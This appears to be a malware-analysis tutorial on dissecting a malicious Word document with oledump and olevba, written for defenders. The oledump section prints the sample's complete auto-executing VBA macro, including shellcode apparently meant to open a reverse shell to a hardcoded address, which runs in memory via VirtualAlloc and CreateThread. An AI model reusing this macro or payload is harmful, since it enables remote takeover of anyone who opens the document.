# MS Office malware analysis


## Identification & analysis of MS Office file

### oledump.py

* Download : https://github.com/DidierStevens/DidierStevensSuite

```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/sample1.doc 
  1:       134 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      6855 '1Table'
  5:       414 'Macros/PROJECT'
  6:        71 'Macros/PROJECTwm'
  7: M    5835 'Macros/VBA/NewMacros'
  8: m     924 'Macros/VBA/ThisDocument'
  9:      2970 'Macros/VBA/_VBA_PROJECT'
 10:       570 'Macros/VBA/dir'
 11:      4096 'WordDocument'
```


```
eloi@Null2Root:~/Desktop/Tools/Malware/DidierStevensSuite$ python oledump.py ../_sample/office/sample1.doc -s 7 -v
Attribute VB_Name = "NewMacros"
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Nafqyank As Long, ByVal Vnrrjm As Long, ByVal Tdjgoqncu As LongPtr, Iifedx As Long, ByVal Hfkkmnus As Long, Oecqwgyd As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Lxvlgm As Long, ByVal Xuj As Long, ByVal Zgootc As Long, ByVal Vgwnrkce As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Ajkkbh As LongPtr, ByRef Qjxm As Any, ByVal Ilz As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal Nafqyank As Long, ByVal Vnrrjm As Long, ByVal Tdjgoqncu As Long, Iifedx As Long, ByVal Hfkkmnus As Long, Oecqwgyd As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Lxvlgm As Long, ByVal Xuj As Long, ByVal Zgootc As Long, ByVal Vgwnrkce As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Ajkkbh As Long, ByRef Qjxm As Any, ByVal Ilz As Long) As Long
#End If

Sub Auto_Open()
    Dim Aocecbpeg As Long, Rdzdaqe As Variant, Urewm As Long
#If VBA7 Then
    Dim Ijzphffi As LongPtr, Xogqxbyy As LongPtr
#Else
    Dim Ijzphffi As Long, Xogqxbyy As Long
#End If
    Rdzdaqe = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, _
139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, _
199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, _
139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, _
1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, _
91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 104, 51, 50, 0, _
0, 104, 119, 115, 50, 95, 84, 104, 76, 119, 38, 7, 255, 213, 184, 144, 1, 0, 0, 41, _
196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 106, 5, 104, 172, 17, 0, 2, 104, 2, 0, _
17, 92, 137, 230, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, _
106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 12, 255, 78, 8, 117, 236, _
104, 240, 181, 162, 86, 255, 213, 106, 0, 106, 4, 86, 87, 104, 2, 217, 200, 95, 255, 213, _
139, 54, 106, 64, 104, 0, 16, 0, 0, 86, 106, 0, 104, 88, 164, 83, 229, 255, 213, 147, _
83, 106, 0, 86, 83, 87, 104, 2, 217, 200, 95, 255, 213, 1, 195, 41, 198, 117, 238, 195 _
)

    Ijzphffi = VirtualAlloc(0, UBound(Rdzdaqe), &H1000, &H40)
    For Urewm = LBound(Rdzdaqe) To UBound(Rdzdaqe)
        Aocecbpeg = Rdzdaqe(Urewm)
        Xogqxbyy = RtlMoveMemory(Ijzphffi + Urewm, Aocecbpeg, 1)
    Next Urewm
    Xogqxbyy = CreateThread(0, 0, Ijzphffi, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
```


## VBA macro analysis

### olevba

* Download : https://github.com/decalage2/oletools

```
eloi@Null2Root:~/Desktop/Tools/Malware$ olevba malvba -a --decode
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
TXT:MAS--B-- malvba
===============================================================================
FILE: malvba
Type: Text
-------------------------------------------------------------------------------
VBA MACRO malvba 
in file: malvba - OLE stream: ''
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | AutoOpen             | Runs when the Word document is opened   |
| AutoExec   | Auto_Open            | Runs when the Excel Workbook is opened  |
| AutoExec   | Workbook_Open        | Runs when the Excel Workbook is opened  |
| Suspicious | CreateThread         | May inject code into another process    |
| Suspicious | VirtualAlloc         | May inject code into another process    |
| Suspicious | RtlMoveMemory        | May inject code into another process    |
| Suspicious | Lib                  | May run code from a DLL                 |
| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
|            |                      | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| Base64     | '\x91\xea\xe7z]\xf6' | kernel32                                |
| String     |                      |                                         |
+------------+----------------------+-----------------------------------------+
```

### vipermonkey

* Download : https://github.com/decalage2/ViperMonkey

